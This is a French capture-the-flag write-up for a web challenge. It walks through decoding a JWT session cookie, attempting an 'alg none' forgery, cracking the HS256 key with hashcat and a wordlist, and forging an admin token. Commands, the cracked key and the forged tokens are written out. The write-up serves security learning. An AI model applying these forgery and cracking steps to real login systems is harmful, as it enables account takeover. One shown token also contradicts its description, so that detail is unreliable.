# Web - KoroDesign
![énoncé](images/korodesign.png)  
On se rend à l'URL indiqué.  
![index](images/korodesign_index.jpg)  
On check le code source... rien d'intéressant.  
On regarde s'il n'y a pas de "robots.txt" ou "sitemap.xml"... Ni l'un ni l'autre.  
On clique sur "A propos".  
```
Hello, Gros merci a Koro pour son design et merci a vous pour la participation :)
Vu que vous êtes sympa on vous a créé un compte guest/guest sur l'appli ... ;)
Peace ! Unknown101
```
On apprend donc qu'un compte guest/guest existe.  
On retourne à l'accueil et on va sur "login".  
Rien dans le code source. On teste guest/guest. Et on est redirigé vers "/flag.php".  
![flag.php](images/korodesign_flag_php.jpg)  
Toujours rien dans le code source.  
On regarde les cookies : `F12 > Stockage`  
Il y a un cookie nommé `custom` et qui a pour valeur : `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOiJmYWxzZSJ9.th6ARHDhsvWtOqW38esNe269u2NJlm_CE3t9nXZLHrY`  
On reconnait içi un JWT (JSON Web Token) par sa forme : [data].[data].[data]  
On se renseigne sur le JWT. La page [Wikipédia anglaise](https://en.wikipedia.org/wiki/JSON_Web_Token) nous explique ce qu'est ce token et de quoi il est composé.  
![structure JWT](images/korodesign_wiki_jwt.png)  
On récupère notre token puis on le décode.
```
$ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
{"typ":"JWT","alg":"HS256"}
$ echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOiJmYWxzZSJ9" | base64 -d
{"username":"guest","is_admin":"false"}
$ echo "th6ARHDhsvWtOqW38esNe269u2NJlm_CE3t9nXZLHrY" | base64 -d
{n��cI�base64: entrée incorrecte
```
La dernière partie, illisible, s'agit de la signature.  
On apprend que notre token est signé avec l'algorithme HS256 et contient un champs qui pourrait nous intéresser : "is_admin":"false"  
On se renseigne sur les différentes attaques possibles avec un JWT : [](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)  
On peut donc : 
* mettre la valeur du champs "alg" à "none"
* changer l'algorithme de RS256 à HS256 (içi, nous sommes déjà en HS256, l'attaque n'est donc pas réalisable)
* cracker la clé utilisée pour générer la signature
## Mettre la valeur du champs "alg" à "none"
On essaie la 1ère technique (on pense bien sûr à changer la valeur de "is_admin"): 
```
$ echo '{"typ":"JWT","alg":"none"}' | base64 > crafted
$ echo "." >> crafted
$ echo '{"username":"guest","is_admin":"true"}' | base64 >> crafted
$ echo "." >> crafted
```
On enlève les retours à la ligne avec un éditeur de texte ainsi que les "=" afin d'avoir un token correct car le JWT doit être base64url encodé.  
On a donc : `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOiJmYWxzZSJ9Cg.`  
On retourne sur notre navigateur. On change la valeur de "custom" par le token que l'on vient de créer.  
On recharge la page... et on se prend un "500 Internal Server Error". L'attaque n'a pas marchée.
## Cracker la clé utilisée pour générer la signature
On a vu tout à l'heure que l'on pouvait également cracker la clé utilisée pour générer la signature afin de pouvoir signer nos tokens de la même manière que le serveur le fait !  
On utilise alors hashcat :
```
$ hashcat -a0 -m 16500 jwt /usr/share/worldlists/rockyou.txt
[...] peu de temps après, on a la clé
!passw0rd
```
La clé utilisée pour signer les tokens est donc "!passw0rd".  
A présent, on peut se rendre sur [CyberChef](https://gchq.github.io/CyberChef/) afin de nous simplifier la tâche. 
On ajoute JWT Sign, puis on change l'algorithme pour "HS256", on remplit le champs Private/Secret Key par "!passw0rd" et en input on met le payload de notre JWT soit `{"username":"guest","is_admin":"true"}`.  
On copie le token que CyberChef nous a gentillement construit : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOiJ0cnVlIiwiaWF0IjoxNTg0MjM2OTI1fQ.2l-phLQqXNuGIpIxVN4vbY9NNMs8csBE1LN4uD1s630`  
On retourne sur la page de notre challenge et on modifie le cookie "custom" par notre nouveau token. On recharge la page.  
![flag](images/korodesign_flag.jpg)  
  
**FLAG : BC{Thanks_K0r0_for_css}**
